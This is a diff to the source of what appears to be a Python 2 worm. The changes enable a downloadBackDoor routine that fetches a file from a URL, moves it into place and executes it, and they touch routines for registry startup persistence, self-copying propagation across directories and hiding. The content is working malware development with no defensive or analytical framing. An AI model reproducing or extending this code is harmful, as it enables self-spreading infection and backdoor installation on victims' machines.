@@ -60,7 +60,8 @@ def verification(source, worm, dst):
 	code = dst + worm
 	if source == code:
 		source = os.path.abspath(dst + worm)
-		downloadBackDoor(URL)
+		print'\t[SOURCE WORM]', source
+		downloadBackDoor(URL, dst)
 	else:
 		pass
 	
@@ -91,15 +92,17 @@ def addStartup():
         SetValueEx(key2change, "Process", 0, REG_SZ, new_file_path)
 
 
-def downloadBackDoor(url):
+def downloadBackDoor(url, path):
         print'	[START DOWNLOAD]',src
         filename = url.split('/')[-1].split('#')[0].split('?')[0]
         content = urlopen(url).read()
         outfile = open(filename, "wb")
         outfile.write(content)
         outfile.close()
+	source= os.path.abspath(filename)
+	shutil.move(source, path)
 	print'\t[DOWNLOAD IN]',os.path.abspath(filename)
-        #run(os.path.abspath(filename))
+        run(os.path.abspath(filename))
         print'\t[DOWNLOAD DONE]', src
 
 
@@ -173,7 +176,7 @@ def duplicate(hexfile):
         filename.close()
 
 def propagate():
-        print("==========Worm location==========")
+        print("[===============Worm location==========]")
         for d, w in hexDir:
                 if linux_client():
                         dst = '/' + usr + '/' + d + '/' + str(w) + '.py'
@@ -182,8 +185,7 @@ def propagate():
 		localization.append(dst)
                 copyHex(w, src, dst)
                 duplicate(dst)
-                #run(dst)
-        print("=================================")
+        print("[======================================]")
 
 def hide():
         for fname in os.listdir('.'):
